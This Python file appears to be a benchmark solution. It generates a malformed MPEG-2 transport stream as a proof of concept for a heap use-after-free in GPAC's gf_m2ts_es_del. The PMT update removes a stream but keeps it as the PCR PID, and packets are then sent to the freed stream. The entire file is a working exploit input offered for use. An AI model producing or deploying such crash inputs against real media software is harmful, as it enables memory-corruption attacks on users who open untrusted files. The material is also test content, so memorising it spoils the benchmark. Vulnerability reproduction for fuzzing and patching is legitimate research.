import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in gf_m2ts_es_del.
        Strategy:
        1. Create a PAT defining a Program.
        2. Create a PMT (v0) defining an Elementary Stream (ES) and setting it as the PCR PID.
        3. Create a PMT (v1) that updates the Program. It removes the ES from the stream loop 
           but keeps the PCR PID pointing to the same ES ID. This typically triggers the
           vulnerable function `gf_m2ts_es_del` to free the ES structure while the program 
           context might retain a dangling reference to it via the PCR mapping or internal state.
        4. Send packets destined for the freed ES PID to trigger the UAF during processing.
        """

        def crc32_mpeg(data):
            crc = 0xFFFFFFFF
            for byte in data:
                for i in range(8):
                    bit = (byte >> (7 - i)) & 1
                    c31 = (crc >> 31) & 1
                    crc = (crc << 1) & 0xFFFFFFFF
                    if c31 ^ bit:
                        crc ^= 0x04C11DB7
            return crc

        def make_packet(pid, counter, payload, pusi=False):
            # TS Header construction
            # Sync Byte (0x47)
            h1 = 0x47
            # TEI(0), PUSI(1/0), Prio(0), PID_HI(5)
            h2 = ((0x40 if pusi else 0x00) | ((pid >> 8) & 0x1F)) & 0xFF
            h3 = pid & 0xFF
            # Scram(00), Adapt(01), Counter(4)
            h4 = (0x10 | (counter & 0x0F)) & 0xFF
            
            header = struct.pack('>BBBB', h1, h2, h3, h4)
            
            if pusi:
                # Pointer field 0x00 for start of section
                body = b'\x00' + payload
            else:
                body = payload
            
            # Fill remaining bytes with 0xFF (stuffing)
            pad_len = 188 - len(header) - len(body)
            if pad_len < 0:
                pad_len = 0
                body = body[:188-len(header)]
                
            return header + body + b'\xff' * pad_len

        def make_pat(ts_id, programs):
            # Construct PAT Section
            prog_bytes = b''
            for p_num, p_pid in programs.items():
                prog_bytes += struct.pack('>HH', p_num, 0xE000 | p_pid)
            
            # 3 bytes header + data + 4 bytes CRC
            section_len = 3 + len(prog_bytes) + 4
            
            # Section Syntax Indicator(1), '0', Reserved(11), Length(12)
            h2_3 = 0xB000 | (section_len & 0x0FFF)
            
            # Version 0, CurrentNext 1
            b6 = 0xC1 
            
            header = struct.pack('>BHHBBB', 0x00, h2_3, ts_id, b6, 0x00, 0x00)
            data = header + prog_bytes
            crc = crc32_mpeg(data)
            return data + struct.pack('>I', crc)

        def make_pmt(prog_num, pcr_pid, streams, version):
            # Construct PMT Section
            stream_bytes = b''
            for st, epid in streams:
                # StreamType(8), Res(111), ES_PID(13), Res(1111), InfoLen(12)=0
                stream_bytes += struct.pack('>BHH', st, 0xE000 | epid, 0xF000)
            
            # Header(3) + PCR(2) + ProgInfoLen(2) + Streams + CRC(4)
            section_len = 3 + 4 + len(stream_bytes) + 4
            h2_3 = 0xB000 | (section_len & 0x0FFF)
            
            # Version handling
            b6 = 0xC1 | ((version & 0x1F) << 1)
            
            # PMT Header
            h1 = struct.pack('>BHHBBB', 0x02, h2_3, prog_num, b6, 0x00, 0x00)
            
            # PCR PID and Program Info Length (0)
            h_pcr = struct.pack('>HH', 0xE000 | pcr_pid, 0xF000)
            
            data = h1 + h_pcr + stream_bytes
            crc = crc32_mpeg(data)
            return data + struct.pack('>I', crc)

        # M2TS Configuration
        PAT_PID = 0x0000
        PMT_PID = 0x0100
        ES_PID  = 0x0200
        
        out = b''
        
        # Packet 1: PAT
        # Program 1 maps to PMT_PID
        pat_data = make_pat(1, {1: PMT_PID})
        out += make_packet(PAT_PID, 0, pat_data, pusi=True)
        
        # Packet 2: PMT Version 0
        # Program 1 defines ES_PID (Type 0x0F - AAC) and uses it as PCR_PID
        pmt_v0 = make_pmt(1, ES_PID, [(0x0F, ES_PID)], version=0)
        out += make_packet(PMT_PID, 0, pmt_v0, pusi=True)
        
        # Packet 3: PMT Version 1 (Update)
        # Program 1 removes ES_PID from the stream loop but keeps it as PCR_PID.
        # This discrepancy combined with the update logic is a common cause for UAF in gf_m2ts_es_del.
        pmt_v1 = make_pmt(1, ES_PID, [], version=1)
        out += make_packet(PMT_PID, 1, pmt_v1, pusi=True)
        
        # Packet 4, 5, 6: Payload on the freed ES_PID
        # These packets attempt to access the freed structure.
        junk_payload = b'\xAA' * 180
        out += make_packet(ES_PID, 0, junk_payload)
        out += make_packet(ES_PID, 1, junk_payload)
        out += make_packet(ES_PID, 2, junk_payload)
        
        return out
